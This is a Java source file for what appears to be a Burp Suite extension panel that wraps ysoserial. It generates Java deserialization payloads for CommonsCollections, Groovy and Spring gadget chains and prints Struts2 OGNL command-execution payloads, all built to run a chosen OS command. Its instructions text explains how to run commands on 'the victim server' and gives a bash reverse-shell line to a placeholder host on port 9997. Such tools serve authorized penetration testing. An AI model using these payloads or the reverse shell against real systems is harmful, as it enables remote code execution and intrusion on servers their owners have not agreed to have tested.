package com.josh;

import java.awt.BorderLayout;
import java.awt.EventQueue;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.ButtonGroup;
import javax.swing.SpringLayout;
import javax.swing.JSplitPane;
import javax.swing.JRadioButton;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.JLabel;
import javax.swing.JButton;
import javax.swing.SwingConstants;

import ysoserial.GeneratePayload;
import ysoserial.payloads.ObjectPayload;

import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.Base64;

import javax.swing.JTextArea;
import javax.swing.JScrollPane;
import javax.swing.ScrollPaneConstants;

import java.awt.FlowLayout;

import javax.swing.BoxLayout;

public class ysoserialFrame extends JPanel {

	private JPanel contentPane;
	private JTextField cmdtxt;
	private JTextPane outtxt;
	private JRadioButton cc1rdo;
	private JRadioButton cc2rdo;
	private JRadioButton grvrdo;
	private JRadioButton spgrdo;
	private ButtonGroup group;
	private JRadioButton stsrdo;
	private JRadioButton insrdo;
	private String payloadStr;
	private byte[] rawPayload;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					ysoserialFrame frame = new ysoserialFrame();
					frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the frame.
	 */
	public ysoserialFrame() {

		contentPane = this;
		setLayout(null);
		
		cmdtxt = new JTextField();
		cmdtxt.setBounds(125, 58, 217, 29);
		contentPane.add(cmdtxt);
		cmdtxt.setColumns(10);
		
		JLabel lblOsCmd = new JLabel("OS CMD:");
		lblOsCmd.setBounds(58, 65, 77, 14);
		contentPane.add(lblOsCmd);
		
		JButton genbtn = new JButton("Generate");
		genbtn.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent arg0) {
				String payloadType = "CommonsCollections1";
				if(cc1rdo.isSelected())
					payloadType = "CommonsCollections1";
				else if(cc2rdo.isSelected())
					payloadType = "CommonsCollections2";
				else if(grvrdo.isSelected())
					payloadType = "Groovy1";
				else if(spgrdo.isSelected())
					payloadType = "Spring1";
				if(insrdo.isSelected()){
					outtxt.setText(getInstructions());
				}else if(!stsrdo.isSelected())
					outtxt.setText(executeYsoSerial(payloadType, cmdtxt.getText().trim()));
				else
					outtxt.setText(strutsExploit(cmdtxt.getText().trim()));
			}
		});
		genbtn.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
			}
		});
		genbtn.setBounds(352, 58, 130, 30);
		contentPane.add(genbtn);
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		scrollPane.setBounds(33, 98, 662, 681);
		add(scrollPane);
		
		outtxt = new JTextPane();
		//outtxt.setLineWrap(true);
		outtxt.setContentType("text/html");
		scrollPane.setViewportView(outtxt);
		
		JPanel panel = new JPanel();
		panel.setBounds(58, 11, 735, 43);
		add(panel);
				 panel.setLayout(new BoxLayout(panel, BoxLayout.X_AXIS));
		
				
				 cc1rdo = new JRadioButton("CC1");
				panel.add(cc1rdo);
				cc1rdo.setSelected(true);
				cc1rdo.setToolTipText("CommonsCollections1");
				
				 cc2rdo = new JRadioButton("CC2");
				panel.add(cc2rdo);
				cc2rdo.setToolTipText("Commons Collections2");
				
				 grvrdo = new JRadioButton("Groovy1");
				panel.add(grvrdo);
				
				 spgrdo = new JRadioButton("Spring1");
				panel.add(spgrdo);
				stsrdo = new JRadioButton("Struts2");
				panel.add(stsrdo);
				insrdo = new JRadioButton("Instructions");
				panel.add(insrdo);
				group = new ButtonGroup();
				group.add(cc1rdo);
				group.add(cc2rdo);
				group.add(grvrdo);
				group.add(spgrdo);
				group.add(stsrdo);
				group.add(insrdo);
				
				
				
				
	}
	private String div(String text, String cls){
		return "<div class='"+cls+"'>"+text+"</div><br>";
	}
	private String p(String text, String cls){
		return "<p class='"+cls+"'>"+text+"</p><br>";
	}
	private String css="<style> .code{padding:10px; width:480px; color:red; word-wrap:break-word;background-color:#D8D8D8; border: solid 1px black; word-wrap:break-word;}"
			+ ".title{padding:2px; color:white;background-color:black;word-wrap:break-word;}"
			+ "body{word-wrap:break-word;"
			+ "}"
			+ ".text{width:480px; word-wrap:break-word;word-wrap:break-word;}"
			+ ".code2{"
			+ "padding:2px; width:400px; color:red; word-wrap:break-word;background-color:#D8D8D8; border: solid 1px black; word-wrap:break-word;"
			+ "}"
			+ "</style>";
	
	private String getInstructions(){

		String tmp = "<html><head>" + css + "</head><body style='width:100px'>" + div("Instructions","title");
		tmp +=div("There are 3 ways to run this extension. <br>"
				+ "<ol>"
				+ "<li> Generate a payload from the menu above. You can then copy and paste it into other tabs in burp.</li>"
				+ "<li> Generate a payload from the menu above. In another tab you can select the text you want to replace and right click. You have 3 options to replace."
				+ "<ol>"
				+ "<li><b>Raw</b> - This will replace your selected text with an unencoded version of the payload. This is raw binary/hex.<li>"
				+ "<li><b>B64</b> - This payload will replace your selected text with a base64 encoded version.</li>"
				+ "<li><b>URLEnc</b> - This will replace your selected text with a URL encoded and base64 encoded payload. Ideal for web type applications</li>"
				+ "</ol>"
				+ "<li> You can use inline commands to replace your text with a payload that contains your command. For example you can enter text in repeater like:<br> "
				+ div("$(CC1|ping -c1 8.8.8.8)","code2")
				+ "Select the above text and right click any of the Java Serialized Payload Options and it will replace your command with a payload containing that command."
				+ "</ol>"
				+ "<b>Note ysoserial in this extension has been updated to accept more complicated commands  that in the original</b>. "
				+ "For instance commands the following command would fail to execute on the victim server:"
				+ div("echo test > /tmp/text.txt","code2") + "or" + div("bash -c \"echo test > /tmp/text.txt\"","code2") +"<br>"
				+ "This is because to run complex command or pipe command into other commands in java the arguments needs to be a string Array."
				+ " This has been modified in this version by using a delimter of <b>\",,\".</b> to seperate your arguments to the string array.<br><br>"
				+ "Here is an example of running a more complicated command using this method to get a reverse shell:<br>"
				+ div("/bin/bash,,-c,,bash -i >& /dev/tcp/X.X.X.X/9997 0>&1","code2")
				+ "<br>"
				+ "The above code will be split into a string array that java can run on the victim server. :) The resulting function would look like:"
				+ div("Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/X.X.X.X/9997 0>&1\"});", "code2"), "text"); 
		tmp += "</body></html>";
		return tmp;
		
	}
	private String strutsExploit(String cmd){
		payloadStr="";
		rawPayload=new byte[]{};
		String payload0 = "%23f=%23_memberAccess.getClass%28%29"
				+ ".getDeclaredField%28%27allowStaticMethodAccess%27%29,"
				+ "%23f.setAccessible%28true%29,"
				+ "%23f.set%28%23_memberAccess,"
				+ "true%29,"
				+ "@java.lang.Runtime@getRuntime%28%29.exec%28%27CMDHERE%27%29";
		String payload6 = "?redirect:%25{%23_memberAccess[%27allowStaticMethodAccess%27]%3dtrue,@java.lang.Runtime@getRuntime().exec(%27CMDHERE%27)}";
		String payload7 = "?redirect:%25{%23_memberAccess%3dnew+com.opensymphony.xwork2.ognl.SecurityMemberAccess(true),@java.lang.Runtime@getRuntime().exec(%27CMDHERE%27)}";
		
		cmd = cmd.replace("'", "\\'");
		try {
			cmd = URLEncoder.encode(cmd, "UTF-8");
		} catch (UnsupportedEncodingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		payload0 = payload0.replace("CMDHERE", cmd);
		payload6 = payload6.replace("CMDHERE", cmd);
		payload7 = payload7.replace("CMDHERE", cmd);
		
		
		String payload1 = "?debug=browser";
		String payload2 = "?debug=browser&object=%23action";
		String payload3 = "?debug=command&expression={3*4}";
		String payload4 = "?action:%25{3*5}<br>?redirect:%25{3*5}\r\n";
		String payload5 = "?redirect:http://www.google.com";
		
		String tmp = "<html><head>" + css + "</head><body style='width:100px'>" + div("Non Debug Command Line Exploits:","title");
		tmp += "---Struts < 2.3.14.1:<br>";
		tmp += p(payload6, "code");
		tmp += "---Struts 2.3.14.2:<br>";
		tmp += p(payload7, "code");
		tmp += "---Other(non-command injection):<br>";
		tmp += p(payload4 + "<br><br>" + payload5, "code");
		tmp += div("Debug Mode Attacks:","title");
		tmp += p("?debug=command&expression="+ payload0, "code"); 
		tmp += "---Other(non-command injection):<br>";
		tmp += p(payload1 + "<br>" + payload2 + "<br>" + payload3,"code");
		tmp += div("Other Info:", "tile");
		tmp +="Struts apps usually end in the following extensions [.do, .action, .go]";
		tmp += "</body></html>";
		return tmp;
	}
	
	public String executeYsoSerial(String payloadType, String command){
		
		final Class<? extends ObjectPayload> payloadClass = getPayloadClass(payloadType);
		if (payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass)) {
			System.err.println("Invalid payload type '" + payloadType + "'");
		}
		
		try {
			final ObjectPayload payload = payloadClass.newInstance();
			final Object object = payload.getObject(command);
			final ByteArrayOutputStream bos = new ByteArrayOutputStream();
			final ObjectOutputStream objOut = new ObjectOutputStream(bos);
			objOut.writeObject(object);
			rawPayload = bos.toByteArray();
			payloadStr = Base64.getEncoder().encodeToString(rawPayload);
			String encoded = "<html><head>" + css + "</head><body>" +div(payloadType + " payload:", "title") + p(payloadStr,"code") + "</body></html>";
			return encoded;
		} catch (Throwable e) {
			System.err.println("Error while generating or serializing payload");
			e.printStackTrace();
			return e.getMessage();
		}		
	}
	@SuppressWarnings("unchecked")
	private static Class<? extends ObjectPayload> getPayloadClass(final String className) {
		try {
			return (Class<? extends ObjectPayload>) Class.forName(className);				
		} catch (Exception e1) {		
		}
		try {
			return (Class<? extends ObjectPayload>) Class.forName(GeneratePayload.class.getPackage().getName() 
				+ ".payloads."  + className);
		} catch (Exception e2) {				
		}			
		return null;		
	}
	
	public Object getPayloadText(String opt) throws UnsupportedEncodingException{
		if(opt.equals("b64"))
			return payloadStr;
		else if(opt.equals("eurl"))
			return URLEncoder.encode(payloadStr, "UTF-8");
		else if(opt.equals("raw"))
			return rawPayload;
		else
			return null;

			
	}
}
